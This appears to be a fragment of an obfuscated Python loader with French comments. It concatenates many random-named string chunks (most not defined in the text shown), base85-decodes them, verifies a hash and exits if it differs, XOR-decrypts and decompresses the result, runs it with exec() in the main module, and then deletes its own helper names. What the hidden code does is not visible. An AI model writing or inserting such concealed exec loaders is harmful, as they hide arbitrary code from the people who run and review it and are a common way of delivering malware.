_cboMeFk119iYOY = 's$8I~bXnv*w9oeDtdnh#tL0hn|Lj~GBo)Z^@4Z!sj{Lb|c9B'
_cr3XSkbezLqD0C = '8}Ej7-}LE3hM=f+3EGjP^<pWEwglO`bZJ`hQGk1@NFS)rN8_'
_cw0Q7dEeLW8rvV = 'yz`(oEWYl9+q9!;Em{amX=Qz%Ylv(NMh-bQRm{cTp-;x@3o='
_ciPD6Ji89r8p3r = '(ps!&~oM4Lb=UAxi9#$MJID_PEbO>FA1`__wuGfsL3R6i!!M'
_cyp9Q3x4qyAYfS = 'O|HS6XCRb(W90r^R$hymEo~4p0Dn^A)afm-F}f^OeprQgI(4'
_coFLlnVXFqKfhR = 'Z5%Ue6vS@skSv=$OsahlVrkiVI)avA_54-^Pfcc$yNoh<M!e'
_cj5VJV1vI4EnuW = '^@!_BXKH}NbRb{>OjoI1}@ncfx_BEZA+iYB~TGehJ_LbH$!m'
_cv9p5vG7S6o2PG = 'HE!{^$!TF(H6MCy{PW_O=_e^X@`?(40v-B(VL7Mkipx^hO-o'
_cg8wIjhPlNdAqV = 'r2GPhC6-pNXHRd7gJV}r7Br<7M=ZHY?RA1Fs)l~at8jc%&Qg'
_cv3lr0rE4VEldG = 'P8+bD$$($U#ANhPRt#rt;dmjogNtfesLBDiO|mm~lfg1z%F2'
_cbBC4HaYuW7kYg = 'RB2A=5^jwYOR}nm;&eL()!lQsAZ8iAsDI0jGsW>ie>PVs^Uj'
_cetCIJ2ZVPQRCu = 'FBU+<pUgq(;SkVtoh8doBN0>5M?{n8|}Yt7qexR+N=ng9krx'
_ckW40XMSYNDz2X = 'b^M=!`GAoWn8!N4iI*tF$SCM{1F!<-z!GHh<)Buv1YKzdG;N'
_cjP_eGy8P793y9 = 'Zws5z|20VD_DTJ-gStWyQ>zl(KDP9#MSP;7uXDjoibzb3r?A'
_cl5IgobPBzhe4a = '5-lXHZDp)Ya~&`XjavWKsj=d{U{CC^`63BAk3$%vQO&_bAMb'
_clQy06ZHhR_Cp_ = 'Z)41r2$Q_x$_kPKu)DA50~U&@^U%F1UZL>n>Rji7$Krl&^nw'
_cjtLbjpC8IMJe4 = '6rWyzi==puaElhw^r5cv(e?Q5LL`)AdTLGT7Z>(_10BvSV1Z'
_clV0G4ACSno95y = 'd|3rS+MA>eUgUWhJil$wCGPx+^w^m*mbJ4WDJp5llPO;|L>2'
_czfrBOujhSAC2Q = '?A(u<JC(MT>gHa`|z>+v~HVV&Y`<0D34i1-ym1{aE`rl_b^o'
_crIBolZn1LJyUw = 'TQZcSzR*{Jrk3>zorKc6?}P7>q$D&u)Vy_JQ|70KFl2HrvMk'
_coNYNnkXqp_xLb = 'VE'

_pum2IfVIPx0ZoK = __import__('base64').b85decode(_cyZ84CSkBMug1z + _cjBDjACBhaq3L1 + _cbRK3CHy_uCNIF + _ckhR0qSLpgmwzh + _chxZswCZX06D_d + _cyiqyWUm2WJPca + _cthSKMZYgxluhV + _cv1Df0rs0rNAI9 + _cqY9NHTIM8iy7R + _czNnchMyCc0Rx_ + _cpXhstmMIFNgyb + _cl7F5ZVIqGBxbm + _caTtusPJA6FAfP + _cvkLqe6klekIj6 + _cpUIrFjH3UomrK + _caMi0b8eZ3Jqa1 + _cxTBVJVsGFWlnt + _cv68An2oEDRC9f + _ckeSzGB9mKOAcS + _cd8noUmfvepC20 + _csAomvkRrvXagR + _cuvrINMFvmSEX1 + _cmqCMMqoTdvQ7T + _cgZb97LKpXPzE1 + _cjRxT5JcrTUC8E + _conDS_887SwD4K + _cj80Ljw9jmQjqm + _cwP1rnlqsZjtwU + _chCPUX1Th37fLk + _cniaVodiZmKYCG + _cuvX8Y46bfpNUJ + _caLjmnjs8gUyl2 + _cnrIlNtIGdsFOF + _cfwnyFrFlQ9KZk + _cbdGwYQAGDzgHk + _cnvWuD_SxN3hlN + _c_2IdIaLVObmp3 + _cqZezIPkmZoA5g + _ccdH9o7dpRoPSt + _cuZwQ0GV9bBA7b + _c_86XqKNtMOETd + _cbm2PwVy8M3Vft + _cg5SE66fknywjf + _cctQ0hRCGxUEKy + _cePG_dFEUin7Iw + _clO3aXg3eC7Yds + _caQUHblMrYc2dt + _cpVD9UlyB66aA7 + _cilIUYOAqRLhtu + _cumPVZ8OVeiIaS + _cxcqjUyOERnUok + _cfsibA94LNQz81 + _cjidz8cekNLkEr + _cwHtabGXvofmnE + _crZqrFjI5BgmpA + _cgTYlz9yeQVuFR + _cpDYPmqhbN5u7O + _ckPIuxeoCO7s8A + _cxxKkg5QJ6OT8p + _cpXQOrqlEq_KNA + _crdzH1wQh94QMF + _cvaVp17XHEeLws + _cusC9i8bW4LOVS + _cyKn7_P1LOz4Hj + _ccsHQrUms8In1i + _ca9f3yZlxGLe8f + _clZlL12rMZfo5X + _cninJJg_RgMzyX + _cjJAhpgGsjAjSH + _cxFutP4rAxHWGI + _ccOTcvqq3NaJfI + _cnoWcet27KrGgC + _cdKPowsSXtLlgr + _cle_kLF4CRQlsd + _cuhDwM4llxbHoq + _cpIwA9yAZPXgfI + _crWw8cYFOm9Yr1 + _czRFB6h5ScriJ3 + _csWl2pcBWoZuJi + _chjgjWir2V83jF + _czhwGHtfPmBSdD + _cpG_wnlaKc3hgQ + _cmgavPRCLrVj4b + _chPBihz47BsrOU + _cuIlHlMZlLuCLd + _chEhl7QfBWQLdP + _chSOlCx2N7QEqO + _ct1674thh2XFv4 + _crpot6K1A0Hes1 + _cpns1N0lUJydcq + _cmAKj4tNVvv2uR + _cmyyIf3jTZ0NeV + _cu_S_XgsT3A5WC + _cxF4icDYY2MtJd + _cuv3mdNZWDHTlg + _cyDDs9VrwIsh5Z + _cbvlj5PLF6Mfml + _cjfRk2p4IMrO5Z + _cosBpmySEUbjlq + _czNLJZYitowpO2 + _cwOW4IwIIqAvM7 + _cuMlJbSjfnN2pd + _cczsqYviz2FARF + _cvJZu9sX5VF8gN + _cm5CP1wdLY_S0n + _ca_GU1ClR5_XeJ + _clFRMZkcbyEf9z + _ceyNmoAe6R5QRR + _c_hnoOQKDzRfJu + _creRtfsAvvofg8 + _cnaq8xUC3deyNa + _ceXmdXVTRs4BSk + _ck8CI19SOZboig + _ckmZmJc1TpUXBw + _ctfssO5uymwaim + _ccrUnamC0ciLVX + _cir_U_qmHpfsYm + _cvKqxHsUyJFOLZ + _cdcnj32yDliInx + _cy8RB42Yhe2tpW + _ceEqggPfszqJia + _co87yyLPcN4_lw + _candVbX1SZNfdB + _cvPFQLXWcawC5Y + _c_tKPgp0uE4BxW + _cvkFI4z8LFqhB8 + _cv3YJ0BzXJACyF + _cyEOtjyQ4p65Bz + _chav1GuanKf3u7 + _cn2flw1oDN0BDS + _chIiwh_hFBl3J8 + _csPMv3qoKmo3yp + _cjlyz3akjcVGdx + _cvfZpt2br4JmBz + _ctjDuoga8yzz5K + _c_0nRq0GwJqOWF + _chLPNMn_kS2zGW + _ceJ6T_wnFiDLeH + _cogvl8OHFPgZXn + _ctPEx0RvZk7L4w + _cwUtUDEM0BbStW + _cn1bf3_jIwcoXY + _caHxErU4hbh6iM + _cyN1ryKVGvDVsN + _cuRKQxZibPs7dY + _cdwaEi7_oQ2O6a + _cjKJiJXfEEZ6NE + _cwUDneMg7_Yyi2 + _c_6RgyL_8e4_gp + _cbmpP820Jquk00 + _coIFPAEKSi0YqB + _cyAiIstFVZteD7 + _cwqZKvDUbXLzf5 + _cyQGYMC1ZkKcLB + _cgBxsZujuM1c19 + _cupkL318XL9cX9 + _ckDB9DCxRg_NxW + _czuedpe7_Ya_iS + _clcvUIhA8lNZaA + _cyyuyr8b9YpWTq + _cov3YcsWrHrsfi + _cpn1uRVyz_0bHr + _cpVwI4gzb4R25I + _cuUKu6v892k8PO + _cjRaWQRq8r0f30 + _ciIL4CCJ0AlU4N + _cj97pZDXitGVib + _cyFW1y0L0ZPFE_ + _coDUVgTiJDZJei + _cillACEdB2MFuq + _coYnB6duF45Rcs + _c_P9NZNdQ9SfMM + _cnthgpJHYxL25w + _ctl0aRoJCxs23q + _ctNyXrsglm9XG8 + _cf1QECGNIWu8H9 + _cgZHpbQOgvHXl4 + _cjsoZwUcZjXc32 + _ckqHrENWWPLKzU + _cd1Ei0ngmORzqd + _cqyq4HHCxzJ81k + _cl83LL4g8FyGH0 + _cqqu2KZhFoJSku + _ca80DdWfd3EW2b + _co60lLQ_L_owfg + _caUBAs0zKFjbLg + _cmQRHwSzmvlSE8 + _cxR1pggMexVkml + _ciemmB6m97s7J6 + _cpFcv8NU3bAW1M + _crSiJqZLm7HBvS + _ctHSKaFudLooRT + _cayIihwbb9TSV_ + _cvra6_RMVYPMCS + _cjn0P2h_RUCbA0 + _cwll54rbSrxaHg + _cxeYRvNMW9gfhQ + _chSPD3qNv7FgrC + _capDFVxb7Vmsam + _ckKEGgEY3gVv0X + _cmIjrtrzpB4qke + _cx2pm13z_yxVdY + _cuO39CV7JtNm2I + _cnYr9shyQe3U3q + _coILQEpALJm57A + _cr_kXrJ0e60O7l + _caeDD4ZiLngI4C + _crj1_MTGDimh91 + _ctFE8ENaC3LvVC + _ct4rmMovKDsyzb + _cdDAhWKzzEa5wa + _cn613JJEZtfNlX + _cbbSmWCgQS7BHs + _cbaLdFBC1YYEo4 + _clef3bRK1reumu + _cboMeFk119iYOY + _cr3XSkbezLqD0C + _cw0Q7dEeLW8rvV + _ciPD6Ji89r8p3r + _cyp9Q3x4qyAYfS + _coFLlnVXFqKfhR + _cj5VJV1vI4EnuW + _cv9p5vG7S6o2PG + _cg8wIjhPlNdAqV + _cv3lr0rE4VEldG + _cbBC4HaYuW7kYg + _cetCIJ2ZVPQRCu + _ckW40XMSYNDz2X + _cjP_eGy8P793y9 + _cl5IgobPBzhe4a + _clQy06ZHhR_Cp_ + _cjtLbjpC8IMJe4 + _clV0G4ACSno95y + _czfrBOujhSAC2Q + _crIBolZn1LJyUw + _coNYNnkXqp_xLb)
if __import__('hashlib').sha256(_pum2IfVIPx0ZoK).hexdigest() != 'e08fe7d6fab736ee7d8975fc03c8df042b5e5f639c82502626bcb45c4f2e1063':
    __import__('sys').exit(1)
_xi7JrTKi09M47V = bytes([217, 131, 72, 151, 7, 10, 81, 134, 9, 243, 108, 146])
_fkwcKXQQH9EUYkD = bytes([157, 176, 45, 244, 179, 64, 1, 11, 20, 100, 98, 112])

def _fxokHHLtitYh_mG(_bx5Ii94yGvd4aZ, _kjzigt8CSpDOJK):
    return bytes(_bx5Ii94yGvd4aZ[_iq3jynVFfZuMXu] ^ _kjzigt8CSpDOJK[_iq3jynVFfZuMXu % len(_kjzigt8CSpDOJK)] for _iq3jynVFfZuMXu in range(len(_bx5Ii94yGvd4aZ)))

def _fdeRK_0AJpP7NGf(_tcASMOwMNvUfU1):
    import zlib
    return zlib.decompress(_tcASMOwMNvUfU1) # Un seul niveau de zlib ici pour simplifier

def _feq34j8vxD6UBUi():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xeKaslGR723RUq = _fxokHHLtitYh_mG(_pum2IfVIPx0ZoK, _xi7JrTKi09M47V)
    # 2. Décompression Zlib
    _dxWx7bGv7pOKpN = _fdeRK_0AJpP7NGf(_xeKaslGR723RUq)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dxWx7bGv7pOKpN.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nqOBr8y_lo1fSe = _main.__dict__
    _nqOBr8y_lo1fSe.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nqOBr8y_lo1fSe)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feq34j8vxD6UBUi()
try:
    del _fxokHHLtitYh_mG, _fdeRK_0AJpP7NGf, _feq34j8vxD6UBUi
    del _pum2IfVIPx0ZoK, _xi7JrTKi09M47V, _fkwcKXQQH9EUYkD
except:
    pass
